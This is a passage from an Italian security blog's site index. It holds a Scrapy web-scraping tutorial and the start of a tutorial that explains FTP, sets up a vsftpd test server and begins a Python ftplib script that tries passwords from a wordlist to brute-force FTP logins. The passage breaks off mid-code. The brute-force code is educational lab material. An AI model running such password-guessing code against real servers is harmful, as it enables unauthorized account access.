spider name e gli url di partenza start_urls che specificano l\u0026rsquo;indirizzo web a cui si vuole fare scraping, la funzione di callback parse() che viene chiamata quando lo spider recupera una pagina web.\nL\u0026rsquo;idea è che tu possa modificare questa classe e adattarlo alle tue esigenze specifiche, aggiungendo eventuali selettori CSS o XPath, gestione dei cookies, trattamento dei dati, ecc.\nModificare il codice del spider: aprire il file spider appena creato e modificare il codice per adattarlo alle esigenze del progetto. È possibile utilizzare il metodo start_requests() per specificare la URL iniziale da cui iniziare a estrarre i dati, il metodo parse() per specificare come estrarre i dati dalle pagine web, e il metodo parse_item() per specificare come estrarre i dati da un singolo elemento della pagina web.\nEseguire lo spider: Come citato in precedenza è possibile utilizzare il comando seguente nella riga di comando per eseguire lo spider:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Dove \u0026lt;nome_spider\u0026gt; è il nome del spider creato in precedenza. In questo modo, verranno stampati i dati estratti nella console o salvati in un file, a seconda delle impostazioni specificate nel codice. Per eseguire lo spider bisogna trovarsi nella directory spiders.\nRicordati che è possibile utilizzare anche il comando\nscrapy shell \u0026lt;url\u0026gt; Questo per testare il codice del tuo spider su una singola pagina web, prima di lanciare la scansione sull\u0026rsquo;intero sito.\nDi seguito vediamo degli esempi usando come URL: http://books.toscrape.com/ che viene usato appositamente per il Web Scraping.\nNota: durante l’esecuzione del codice possono esserci errori per la mancanza del modulo attrs, per installarlo usiamo il comando:\npip install attrs Oppure per Python3:\npip3 install attrs Se abbiamo già questo modulo, possiamo aggiornarlo con il comando:\npip install --upgrade attrs Esempi Pratici Estrazione del titolo di una pagina web import scrapy class TitleSpider(scrapy.Spider): name = \u0026#34;titlespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), } Questo codice crea uno spider chiamato TitleSpider che estende la classe base scrapy.Spider. Nella classe, viene definito un nome per lo spider e una lista di URL di partenza per lo spider. Nel nostro caso, l\u0026rsquo;URL di partenza è una pagina web di un negozio di libri online.\nLa funzione parse() è chiamata ogni volta che lo spider recupera una pagina web. All\u0026rsquo;interno della funzione parse(), utilizziamo un ciclo for per scorrere tutti gli elementi HTML che corrispondono al selettore article.product_pod. Questo selettore seleziona tutti gli elementi  con la classe product_pod nella pagina web.\nPer ogni elemento selezionato, utilizziamo il selettore h3 \u0026gt; a::text per selezionare il testo del primo elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento . Il testo selezionato rappresenta il titolo del libro. Utilizziamo la funzione get() per restituire il valore del titolo del libro come una stringa. Infine, utilizziamo yield per restituire un dizionario contenente il titolo del libro. Alla fine del ciclo for, lo spider avrà raccolto tutti i titoli dei libri presenti nella pagina web di partenza.\nEstrazione dei prezzi dei libri da una pagina web import scrapy class PriceSpider(scrapy.Spider): name = \u0026#34;pricespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice è un esempio di uno spider di Scrapy che estrae i prezzi dei libri da una pagina web specifica.\nLa classe PriceSpider estende la classe base scrapy.Spider e include alcune proprietà e metodi specifici per questo spider.\n La proprietà name assegna un nome allo spider, in questo caso \u0026ldquo;pricespider” La proprietà start_urls specifica gli URL di partenza per lo spider, in questo caso l\u0026rsquo;indirizzo \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026rdquo;  La funzione parse() è il metodo di callback chiamato quando lo spider recupera una pagina web, questa funzione è responsabile di estrarre i dati dalla pagina.\nLa funzione utilizza un ciclo for per ciclare attraverso ogni elemento HTML con classe article.product_pod, questi elementi rappresentano ogni libro presente sulla pagina.\nPer ogni libro, utilizza il selettore CSS .price_color per individuare il prezzo del libro, e utilizza il metodo get() per recuperare il testo del prezzo. Il prezzo estratto viene quindi aggiunto ad un dizionario come valore della chiave \u0026ldquo;price\u0026rdquo; e restituito attraverso l\u0026rsquo;istruzione yield.\nIn sintesi, questo spider recupera la pagina web specificata, estrae i prezzi di ogni libro presente sulla pagina e li restituisce come una serie di dizionari, dove ogni dizionario rappresenta un libro e contiene solo una chiave price con il relativo prezzo del libro.\nEstrazione di tutte le informazioni sui libri da una pagina web import scrapy class BookSpider(scrapy.Spider): name = \u0026#34;bookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice mostra come creare uno spider chiamato \u0026ldquo;bookspider\u0026rdquo; utilizzando il modulo Scrapy in Python. Lo spider inizia a navigare nell\u0026rsquo;indirizzo web specificato in \u0026ldquo;start_urls\u0026rdquo;, che in questo caso è \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse() viene chiamata per ogni pagina visitata dallo spider e consente di analizzare il contenuto della pagina. In questo esempio, la funzione parse() utilizza il metodo \u0026ldquo;css\u0026rdquo; per selezionare tutti gli elementi HTML con la classe \u0026ldquo;product_pod\u0026rdquo; e li itera uno per uno.\nPer ogni elemento, vengono estratte tre informazioni:\n Il titolo del libro utilizzando il selettore \u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag \u0026ldquo;a\u0026rdquo; immediatamente figlio del tag \u0026ldquo;h3\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article” Il prezzo utilizzando il selettore \u0026ldquo;.price_color::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag con classe \u0026ldquo;price_color\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article” La valutazione utilizzando il selettore \u0026ldquo;.star-rating::attr(class)\u0026rdquo;, che seleziona il valore dell\u0026rsquo;attributo \u0026ldquo;class\u0026rdquo; del tag con classe \u0026ldquo;star-rating\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article\u0026rdquo;. Poi si utilizza il metodo \u0026ldquo;split\u0026rdquo; per dividere la stringa in una lista di stringhe, e si prende l\u0026rsquo;ultima parte della stringa cioè l\u0026rsquo;ultimo elemento della lista.  Tutte queste informazioni vengono quindi restituite come un dizionario utilizzando il comando \u0026ldquo;yield\u0026rdquo; all\u0026rsquo;interno del ciclo for.\nEstrazione di tutte le informazioni sui libri da più pagine web import scrapy class MultiPageBookSpider(scrapy.Spider): name = \u0026#34;multipagebookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice è un esempio di uno spider Scrapy che utilizza un ciclo for per estrarre informazioni da più pagine di un sito web.\nIl nome dello spider è multipagebookspider e la pagina iniziale da cui inizia la scansione è \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse è chiamata per ogni pagina e utilizza il metodo css per estrarre informazioni sui libri dalla pagina (titolo, prezzo e valutazione).\nSuccessivamente, utilizza il metodo css per estrarre il link alla prossima pagina e utilizza il metodo response.follow per seguire il link e chiamare nuovamente la funzione parse per la pagina successiva. Ciò consente allo spider di continuare a estrarre informazioni dalle pagine successive finché non viene raggiunta la fine del sito.\nEstrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare import scrapy import re class RegexBookSpider(scrapy.Spider): name = \u0026#34;regexbookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): title = book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get() price = book.css(\u0026#34;.price_color::text\u0026#34;).get() rating = book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get() availability = book.css(\u0026#34;p.availability::text\u0026#34;).get() match = re.search(r\u0026#39;\\d+\u0026#39;, availability) if match: stock = int(match.group(0)) yield { \u0026#34;title\u0026#34;: title, \u0026#34;price\u0026#34;: price, \u0026#34;rating\u0026#34;: rating, \u0026#34;stock\u0026#34;: stock } Questo è un esempio di codice scritto in Python utilizzando la libreria Scrapy per creare un spider chiamato RegexBookSpider.\nIn particolare, questo spider è impostato per iniziare la navigazione nella pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e utilizza l\u0026rsquo;espressione regolare (regex) per estrarre informazioni sul numero di copie disponibili di ciascun libro.\nIl metodo parse è chiamato per ogni pagina visitata dallo spider e utilizza il selettore CSS per selezionare i dati di interesse nella pagina. In questo caso, il spider estrae il titolo, il prezzo, la valutazione e la disponibilità di ogni libro. L\u0026rsquo;espressione regolare re.search(r'\\d+', availability) è utilizzata per cercare una corrispondenza di un numero intero all\u0026rsquo;interno della stringa di disponibilità. Se una corrispondenza viene trovata, il numero di stock disponibili viene salvato in una variabile chiamata \u0026ldquo;stock\u0026rdquo;. Infine, le informazioni estratte vengono restituite come un dizionario.\nEstrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV import scrapy class BookSpiderCSV(scrapy.Spider): name = \u0026#34;bookspidercsv\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;csv\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;books.csv\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice è un esempio di uno spider Scrapy che raccoglie informazioni sui libri presenti su un sito web di esempio \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e le salva in un file CSV. Il nome dello spider è \u0026ldquo;bookspidercsv\u0026rdquo; e la classe principale è BookSpiderCSV che estende la classe base scrapy.Spider.\nLa proprietà start_urls specifica l\u0026rsquo;URL iniziale del sito web da cui lo spider inizierà a raccogliere i dati.\nLa funzione parse viene eseguita per ogni pagina del sito web raccolta dallo spider. In questo caso, utilizza il metodo response.css per selezionare tutti gli elementi HTML con la classe product_pod dalla pagina, che rappresentano i libri. Per ogni libro, raccoglie il titolo, il prezzo e la valutazione utilizzando il metodo \u0026ldquo;css\u0026rdquo; e salva i dati raccolti in un dizionario.\nLa proprietà custom_settings imposta il formato del file di output e il nome del file di output. In questo caso, il formato è impostato su csv e il nome del file su books.csv.\nAlla fine, tutti i dati raccolti dalla funzione parse vengono scritti nel file CSV books.csv nella cartella radice del progetto.\nScraping di dati da più siti import scrapy class MultiSiteBookSpider(scrapy.Spider): name = \u0026#34;multisitebookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, \u0026#34;http://books.toscrape.com/catalogue/category/books/science_23/index.html\u0026#34;] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza un elenco di URL di partenza start_urls che contiene più di un sito web. Utilizzando un solo metodo parse() per estrarre i dati, lo spider esegue la scansione di entrambi i siti web specificati nel elenco e estrae i dati dei libri dalle pagine web.\nScraping di dati da una pagina con autenticazione import scrapy from scrapy.http import FormRequest class MySpider(scrapy.Spider): name = \u0026#34;myspider\u0026#34; start_urls = [ \u0026#34;https://mywebsite.com/login\u0026#34;, ] def parse(self, response): # estraiamo il token CSRF dalla pagina di login csrf_token = response.css(\u0026#34;input[name=\u0026#39;csrf_token\u0026#39;]::attr(value)\u0026#34;).get() # creiamo una richiesta di form con i dati di login e il token CSRF yield FormRequest.from_response(response, formdata={ \u0026#34;username\u0026#34;: \u0026#34;myusername\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;mypassword\u0026#34;, \u0026#34;csrf_token\u0026#34;: csrf_token }, callback=self.after_login) def after_login(self, response): # controlliamo se siamo stati autenticati con successo if \u0026#34;Incorrect username or password\u0026#34; in response.body: self.logger.error(\u0026#34;Login fallito\u0026#34;) return # se siamo stati autenticati con successo, possiamo iniziare a fare scraping for item in response.css(\u0026#34;div.item\u0026#34;): yield { \u0026#34;title\u0026#34;: item.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: item.css(\u0026#34;span.price::text\u0026#34;).get(), \u0026#34;image_url\u0026#34;: item.css(\u0026#34;img::attr(src)\u0026#34;).get() } # e possiamo anche seguire i link per le pagine successive next_page = response.css(\u0026#34;a.next_page::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.after_login) In questo modo, il spider inizia visitando la pagina di login, estrae il token CSRF e invia una richiesta di form con i dati di login e il token. Quindi, utilizza la funzione after_login come callback per gestire la risposta della richiesta di form. In questa funzione, il spider controlla se l\u0026rsquo;autenticazione è stata eseguita con successo e, in caso contrario, registra un errore. In caso contrario, il spider inizia a fare scraping dei dati e a seguire i link per le pagine successive.\nScraping di dati da una pagina AJAX import scrapy class AJAXBookSpider(scrapy.Spider): name = \u0026#34;ajaxbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;] def parse(self, response): # Invia una richiesta POST per ottenere i dati dei libri tramite AJAX yield scrapy.FormRequest( \u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;, formdata={\u0026#34;page\u0026#34;: \u0026#34;2\u0026#34;}, callback=self.parse_ajax_response ) def parse_ajax_response(self, response): # Estraiamo i dati dei libri dalla risposta AJAX for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza il metodo scrapy.FormRequest() per inviare una richiesta POST con i dati del form AJAX alla pagina web. La risposta AJAX contiene i dati dei libri che vengono estratti dalla pagina utilizzando il metodo parse_ajax_response().\nScraping di dati da una pagina utilizzando una sessione import scrapy class SessionBookSpider(scrapy.Spider): name = \u0026#34;sessionbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;] def start_requests(self): # Iniziamo una sessione self.session = scrapy.Session() # Effettuiamo il login return [self.session.post(\u0026#34;http://books.toscrape.com/login\u0026#34;, data={\u0026#34;username\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;})] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza una sessione per effettuare il login alla pagina web prima di iniziare a estrarre i dati. Utilizzando il metodo start_requests() per effettuare il login e il metodo parse() per estrarre i dati, lo spider mantiene la sessione attiva durante tutto il processo di scraping.\nScraping di tutti i prezzi dei libri su tutte le pagine import scrapy class AllPricesSpider(scrapy.Spider): name = \u0026#34;allpricesspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice è un esempio di uno spider Scrapy che estrae i prezzi di tutti i libri presenti sul sito \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e li salva in un formato predefinito.\nIl codice importa la libreria di scrapy, quindi definisce una classe AllPricesSpider che estende la classe base scrapy.Spider.\nLa classe ha un nome univoco name e una lista di URL da cui iniziare a raccogliere i dati start_urls.\nIl metodo parse è chiamato per ogni pagina visitata e utilizza la funzione response.css per selezionare tutti gli elementi article.product_pod sulla pagina. Per ogni elemento selezionato, estrae il prezzo utilizzando la selezione .price_color::text e lo salva in un dizionario.\nInfine, il codice cerca il link per la pagina successiva, se esiste, utilizzando la funzione \u0026ldquo;response.css(\u0026ldquo;li.next \u0026gt; a::attr(href)\u0026quot;).get()\u0026rdquo; e segue il link utilizzando la funzione \u0026ldquo;response.follow(next_page, self.parse)\u0026rdquo; per continuare a raccogliere dati dalle successive pagine.\nScraping di tutti i titoli e le categorie dei libri import scrapy class TitleCategorySpider(scrapy.Spider): name = \u0026#34;titlecategoryspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;category\u0026#34;: response.css(\u0026#34;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per estrarre dati da una pagina web. In particolare, il codice crea una classe chiamata TitleCategorySpider che estrae i titoli dei libri e la categoria dei libri dalla pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa classe TitleCategorySpider estende la classe scrapy.Spider e definisce un metodo parse che viene chiamato quando la pagina specificata in start_urls è scaricata.\nIl metodo parse utilizza il metodo response.css per selezionare gli elementi delle pagine web. Utilizza il metodo css per selezionare gli elementi article.product_pod dalla pagina web. Per ogni elemento selezionato, utilizza il metodo css di nuovo per estrarre il titolo del libro (\u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;) e la categoria del libro (\u0026ldquo;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026rdquo;) e quindi li salva in un dizionario.\nIl metodo yield è utilizzato per restituire il dizionario come risultato del metodo parse. In questo modo, scrapy sa che il risultato deve essere raccolto e utilizzato per qualcos\u0026rsquo;altro, come la scrittura su un file o la memorizzazione in un database.\nScraping delle immagini dei libri import scrapy class BookImageSpider(scrapy.Spider): name = \u0026#34;bookimagespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;image_urls\u0026#34;: book.css(\u0026#34;img::attr(src)\u0026#34;).getall(), } Il codice utilizza la libreria scrapy per creare uno spider chiamato bookimagespider che inizia a navigare dalla pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nIl metodo parse(self, response) viene chiamato per ogni pagina visitata dallo spider. Il metodo cerca tutti gli elementi HTML con classe product_pod che rappresentano i libri nella pagina. Per ogni elemento trovato, estrae il titolo del libro e l\u0026rsquo;URL dell\u0026rsquo;immagine del libro.\nL\u0026rsquo;URL dell\u0026rsquo;immagine del libro viene estratto tramite il metodo .css(\u0026ldquo;img::attr(src)\u0026quot;).getall() che seleziona tutti gli elementi img e estrae l\u0026rsquo;attributo src. Il risultato è una lista di URL delle immagini dei libri.\nQuesti dati estratti vengono quindi restituiti come un dizionario con le chiavi title e image_urls.\nScraping dei prezzi dei libri in un formato specifico (es. JSON) import scrapy class PriceSpiderJSON(scrapy.Spider): name = \u0026#34;pricespiderjson\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;prices.json\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per creare uno spider chiamato PriceSpiderJSON, che inizia a navigare nella pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e recupera i prezzi dei libri presenti su quella pagina. Utilizza il metodo parse() per elaborare la risposta ottenuta dalla pagina web e recuperare i prezzi. Il metodo yield {} serve per generare un dizionario di output contenente la proprietà \u0026ldquo;price\u0026rdquo; con il prezzo del libro.\nIl dizionario custom_settings definisce il formato del feed e il nome del file in cui verranno salvati i dati recuperati dallo spider. In questo caso il feed verrà salvato in formato JSON con nome prices.json.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/","tags":["Web Scraping","Python","Spider"],"title":"Basi sul Modulo Scrapy"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos\u0026rsquo;è il protocollo FTP.\nBasi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. É uno dei protocolli più vecchi di Internet. Già a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp è un protocollo indipendente quindi è possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perché, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C’è una distinzione da fare tra ftp pubblico e ftp privato:\n  ftp pubblico: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso può essere chiamato anche anonymous ftp.\n  ftp privato: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.\n  Il File Transfer Protocol viene eseguito all’interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati. Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodiché entrambi possono creare un canale dati che trasporta i file desiderati da una parte all’altra. Il protocollo controlla eventuali errori.\nÈ necessario distinguere però tra FTP attivo e passivo. Nella variante attiva è il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo può inviare la propria risposta. Ma se il client è protetto da un firewall, allora il server non potrà inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi è stata sviluppata una modalità passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client può creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati. Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual è l’operazione desiderata:\n caricare o scaricare file organizzare cartelle cancellare file  Il server risponde ogni volta con un codice di stato che serve a informare se il comando può essere eseguito o meno con successo. Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All’epoca Internet era ancora molto piccolo e la cybercriminalità non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all’utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.\nPerciò sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.\nIl SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.\nAnche in questo caso la connessione è criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso però bisogna utilizzare un programma aggiuntivo. Vsftpd (acronimo di Very Secure FTP daemon) è un server FTP per sistemi simili a Unix, incluso Linux. È il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. È concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.\nOra che abbiamo compreso cos\u0026rsquo;è il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.\nConfigurazione di un Server FTP con Vsftpd Il pacchetto vsftpd è disponibile nei repository standard. Esegui i seguenti comandi per installarlo:\n$ sudo apt update $ sudo apt install vsftpd Al termine dell\u0026rsquo;installazione, il servizio ftp verrà avviato automaticamente. Stampa lo stato del servizio per confermare:\n$ sudo systemctl status vsftpd È possibile configurare il server vsftpd modificando il file /etc/vsftpd.conf. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili. Per iniziare, apri il file di configurazione vsftpd:\n$ sudo nano /etc/vsftpd.conf Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:\nanonymous_enable=NO local_enable=YES Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:\nsudo adduser newftpuser Impostare la password utente quando richiesto. Aggiungere l\u0026rsquo;utente all\u0026rsquo;elenco degli utenti FTP consentiti:\necho \u0026#34;newftpuser\u0026#34; | sudo tee -a /etc/vsftpd.user_list Crea l\u0026rsquo;albero della directory FTP e imposta le autorizzazioni corrette:\n$ sudo mkdir -p /home/newftpuser/ftp/upload $ sudo chmod 550 /home/newftpuser/ftp $ sudo chmod 750 /home/newftpuser/ftp/upload $ sudo chown -R newftpuser: /home/newftpuser/ftp Per il nostro fine vanno bene queste configurazioni, ma il file /etc/vsftpd.conf ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l\u0026rsquo;argomento.\nBrute Forcing delle credenziali di un server FTP con Python Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:\npip3 install colorama Inizia a scrivere il codice:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (Windows) # init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente \u0026ldquo;test\u0026rdquo;, e poi specifichiamo la porta dell\u0026rsquo;FTP, che è la 21.\nOra scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:\ndef is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True Niente di speciale; inizializziamo l\u0026rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell\u0026rsquo;host e proviamo ad accedere, questo solleverà un\u0026rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.\nUseremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l\u0026rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in \u0026ldquo;/usr/share/wordlists/nmap.lst\u0026rdquo;. Altrimenti, prendilo qui.\nUna volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:\n# read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to 